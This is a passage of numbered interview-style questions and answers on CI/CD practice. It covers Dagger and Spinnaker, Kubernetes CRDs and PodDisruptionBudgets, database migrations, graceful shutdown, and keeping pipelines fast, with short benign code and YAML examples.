## 434: What are the pros and cons of writing pipelines in a real programming language instead of YAML?

Some tools let you define pipelines in code: Dagger (Go, Python, TypeScript), AWS CDK Pipelines, Pulumi automation, Jenkins Groovy, Buildkite's dynamic pipelines.

Pros: loops, functions, types, tests, IDE support, real reuse, and with Dagger you can run the same pipeline locally and in any CI.

Cons: more complex than YAML for simple cases, harder for people unfamiliar with the language, and it's tempting to write clever code nobody understands. YAML remains fine for most pipelines. Code-based pipelines help most when logic gets complex or you want to avoid lock-in to one CI vendor.

## 435: What is Dagger?

Dagger is a tool for writing CI pipelines as code (in Go, Python, TypeScript and other languages) that run inside containers using BuildKit. The same pipeline runs on a laptop and on any CI system, which only needs to call `dagger call ...`.

```ts
import { dag, object, func } from "@dagger.io/dagger";

@object()
export class Ci {
  @func()
  async test(source: Directory): Promise<string> {
    return dag
      .container()
      .from("node:22")
      .withDirectory("/app", source)
      .withWorkdir("/app")
      .withExec(["npm", "ci"])
      .withExec(["npm", "test"])
      .stdout();
  }
}
```

Every step is cached by its inputs. It reduces "works in CI but I can't reproduce it" problems and vendor lock-in, at the cost of another tool to learn.

## 436: What is Spinnaker and when is it used?

Spinnaker is an open source continuous delivery platform created at Netflix. It focuses on deployment, not building: pipelines take artifacts built by CI and deploy them to clouds and Kubernetes with strategies like red/black (blue-green), canary with automated analysis (Kayenta), and manual judgments.

It's powerful for large multi-cloud setups, but heavy to run and operate. Many teams today choose Argo CD with Argo Rollouts, or their cloud's native tools, instead.

## 437: How do you deploy Kubernetes CRDs and operators safely?

Custom resource definitions (CRDs) must exist before custom resources that use them, and operators often must be running before their resources are useful.

- Order with Argo CD sync waves or separate Applications (CRDs first).
- Helm doesn't upgrade CRDs placed in the chart's `crds/` folder, so many teams manage CRDs separately.
- CRD changes are cluster-wide and shared by all namespaces, so test upgrades on a non-production cluster first.
- Removing a CRD deletes all its resources, so protect against accidental deletion.

## 438: How do you run database migrations as part of a Kubernetes deploy?

Options:

- A Kubernetes `Job` run before the deployment, as a Helm `pre-upgrade` hook or Argo CD `PreSync` hook.
- A separate pipeline step that runs migrations with the new image before updating the Deployment.
- An init container: simple, but every pod runs it, so the migration tool must handle locking, and slow migrations delay pod starts.

The Job or pipeline step approach is usually best. Make sure failures stop the rollout, and set `backoffLimit` and timeouts on the Job.

## 439: What are PodDisruptionBudgets and why do they matter for deployments?

A PodDisruptionBudget (PDB) limits how many pods of an app can be down at the same time because of voluntary disruptions, like node drains during cluster upgrades.

```yaml
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: api
spec:
  minAvailable: 2
  selector:
    matchLabels:
      app: api
```

Rolling updates of Deployments follow their own `maxUnavailable`, not the PDB, but cluster and node pool upgrades done by pipelines depend on PDBs to keep apps up. A PDB that is too strict (like `minAvailable` equal to replicas) can block node drains forever.

## 440: How do you make sure no requests fail when old instances shut down?

- The app handles `SIGTERM`: stop accepting new connections, finish in-flight requests, close database connections, then exit.
- In Kubernetes, the pod is removed from endpoints at about the same time `SIGTERM` is sent, so a short `preStop` sleep (a few seconds) avoids traffic hitting a pod that's already closing.
- Set `terminationGracePeriodSeconds` longer than your longest normal request.
- Load balancers use connection draining (deregistration delay).

```js
process.on("SIGTERM", () => {
  server.close(() => process.exit(0));
});
```

Without this, every deploy causes a small burst of errors that is easy to miss.

## 441: How do you deploy services that use WebSockets or other long-lived connections?

Long-lived connections don't move to new instances by themselves, so a rolling deploy can either cut them all at once or wait forever.

- Clients should reconnect automatically with backoff and jitter, so reconnects don't all hit at the same second.
- During shutdown, send a message asking clients to reconnect, then close connections gradually.
- Set a reasonable grace period instead of waiting for every connection to end.
- Keep connection state outside the instance (Redis, a message broker), so any instance can resume.
- Roll out slowly enough that reconnect storms don't overload new instances.

## 442: How do you deploy background workers without losing jobs?

- Workers should finish or release their current job on `SIGTERM` and stop taking new ones.
- Jobs should be idempotent, so a job that's retried after a worker dies doesn't cause double charges or double emails.
- Use queues with acknowledgements and visibility timeouts, so unfinished jobs return to the queue.
- Keep job payload formats compatible across versions, since old jobs may be picked up by new workers and the other way around.
- For very long jobs, add checkpoints so they can resume.

## 443: What problems can scheduled tasks cause during deployments?

- During a rolling or blue-green deploy, both versions may run the same cron job, so it runs twice.
- A job starting right when an instance shuts down gets killed halfway.
- New code may run a job against a schema that's not migrated yet.

Fixes: run scheduled tasks in one place (Kubernetes CronJob with `concurrencyPolicy: Forbid`, a scheduler service), use distributed locks, make jobs idempotent and safe to resume, and pause or skip schedules during big migrations.

## 444: Why can a new deployment be slow right after it starts, and how do you handle it?

New instances often start "cold": empty in-memory caches, no warmed JIT, cold database connection pools, serverless cold starts. If they get full traffic at once, latency spikes and health checks may fail.

- Warm up before marking the instance ready: preload caches, open connection pools, send a few internal requests.
- Use slow start on load balancers, which ramp traffic up to new targets gradually (AWS ALB supports this).
- Roll out gradually so only a few cold instances take traffic at the same time.
- For serverless, use provisioned concurrency or similar for latency-critical functions.

## 445: How do you measure whether a CI/CD improvement effort is working?

Pick a few metrics before starting and track them over time:

- DORA metrics: deployment frequency, lead time, change failure rate, time to restore
- PR pipeline duration (p50 and p90) and queue time
- Main branch green percentage
- Flaky test rate and rerun rate
- Time from merge to production
- Developer survey results about CI and deploys

Compare before and after for each change. Talk to developers too: sometimes metrics look fine but people still work around the pipeline.

## 446: How do you keep a pipeline fast as the codebase grows?

- Make pipeline duration a tracked metric with a target, and treat regressions as bugs.
- Use affected-only builds and test selection, so time grows with the size of the change, not the size of the repo.
- Use remote caching and parallelism.
- Keep the test pyramid healthy: don't let E2E tests grow without limit.
- Regularly delete tests that duplicate others or test nothing useful.
- Give someone ownership of CI performance.

Without this, pipelines slowly get a little slower every month until people stop trusting them.

## 447: How do you decide what runs on a PR, in the merge queue, after merge, and nightly?

Balance speed and safety by risk and cost:

| When        | What runs                                                     |
| ----------- | ------------------------------------------------------------- |
| PR          | Lint, types, unit tests, affected integration tests, build    |
| Merge queue | Same checks on the combined change, plus critical E2E tests   |
| After merge | Build and push artifact, deploy to staging, smoke tests       |
| Before prod | Full E2E against staging, approval if needed                  |
| Nightly     | Full E2E across browsers, performance, DAST, dependency scans |

Anything that only runs later must have someone watching its results, or it becomes useless.

## 448: How would you explain the overall design principles of a good CI/CD system?

- **Small batches**: merge and deploy small changes often.
- **Everything as code**: pipelines, infrastructure, config, policies.
- **Build once**: one immutable artifact promoted through environments.
- **Fast feedback**: cheap checks first, parallel work, caching.
- **Reliable signals**: no flaky tests, red means a real problem.
- **Least privilege**: short-lived credentials, scoped tokens, protected environments.
- **Safe releases**: progressive delivery, feature flags, automatic rollback.
- **Observability**: know what's running and how it's doing.
- **Reproducibility**: pinned dependencies and tools.
- **Ownership**: teams own their pipelines, a platform team makes the easy path the right one.

## 449: How would you review a team's CI/CD setup when joining a new company?

Ask and check:

1. How does code get from a commit to production? Walk through it with someone.
2. How long does it take, and where does it wait?
3. How often do they deploy, and how often do deploys cause problems?
4. How do they roll back, and when did they last do it?
5. Where do secrets live, and who can access production?
6. Is main usually green? How many flaky tests are there?
7. What is manual that could be automated?
8. Are pipelines copy-pasted or shared templates?

Then pick the one or two problems that hurt the most (often slow pipelines, flaky tests or scary deploys) and fix those first, rather than redesigning everything at once.

## 450: What do you think is the hardest part of CI/CD in practice?

Usually it's not the tools, it's the habits and the edge cases:

- Keeping tests fast and reliable as the codebase grows
- Database and API changes that must work across versions during deploys
- Getting the team to merge small changes often and fix red builds right away
- Keeping security tight (secrets, supply chain) without making the pipeline painful
- Making rollbacks and fixes fast enough that people aren't afraid to deploy

A good answer in an interview shows that you know the tools, but also that you've dealt with these trade-offs on a real team and know CI/CD is a practice, not just a YAML file.
